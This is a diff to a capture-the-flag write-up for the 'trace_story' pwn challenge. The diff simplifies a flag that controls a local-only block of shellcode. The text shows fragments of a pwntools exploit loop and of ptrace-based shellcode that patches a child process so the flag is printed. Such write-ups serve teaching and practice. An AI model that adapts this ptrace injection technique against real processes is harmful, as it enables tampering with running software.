@@ -354,10 +354,8 @@ binary = context.binary = ELF('./trace_story', checksec=False)
 while True:
     if args.REMOTE:
         p = remote('0.cloud.chals.io', 15148)
-        online = 1
     else:
         p = process(binary.path)
-        online = 0
 
     p.recvuntil(b'child pid: ')
     pid = int(p.recvline().strip().decode(),10)
@@ -374,9 +372,8 @@ while True:
 
 Mostly standard pwntools header with the following additions:
 
-1. `online` is set to provide an easy assembly directive, more on this later.
-2. If the PID is even OR if local, then `break` and move on.
-3. I found that the remote is either always even or always odd with serial attempts.  Clearly it'd be more chaotic if multiple users hitting the service, however while writing this write up, I noticed it was one or the other.  I could break up the odd streak with an `nc` command in a different terminal window, but opted to automate with the `s = remote...`--same effect.
+1. If the PID is even OR if local, then `break` and move on.
+2. I found that the remote is either always even or always odd with serial attempts.  Clearly it'd be more chaotic if multiple users hitting the service, however while writing this write up, I noticed it was one or the other.  I could break up the odd streak with an `nc` command in a different terminal window, but opted to automate with the `s = remote...`--same effect.
 
 ```python
 # use ptrace to patch out right after read to just call puts
@@ -489,7 +486,7 @@ mov rax, {constants.SYS_ptrace}
 syscall
 
 /* patch out even pid check, does not work remotely */
-.if {online} == 0
+.if {0 if args.REMOTE else 1}
 mov rdx, {0x40179d}
 mov rax, {constants.SYS_ptrace}
 syscall
@@ -512,7 +509,7 @@ assert(len(payload) < 0x1ff)
 The above shellcode is the same as the C code POC with the following three exceptions:
 
 1. The `sleep(<=1)` block does not really sleep for one second.  On average it'll sleep for `0.5` seconds.  With a bit more code I could get this to one second, but it was good enough (and is necessary).
-2. The `.if {online} == 0` block will patch out the even PID check if testing locally.  This code does not work remotely (actually I think it is safe to run, but you do not get the desired results).
+2. The `.if {0 if args.REMOTE else 1}` block will patch out the even PID check if testing locally.  This code does not work remotely (actually I think it is safe to run, but you do not get the desired results).
 3. The `jmp $`, it just an endless loop, this prevents the parent process from crashing; we need time for the flag to be emitted.
 
 The `assert` is there to make sure the payload does not exceed `0x1ff` bytes.  There's some shitfuckery in `read_input` that overwrites the `0x1ff`th byte.  It can be mitigated if you did have longer code, but there was no need.
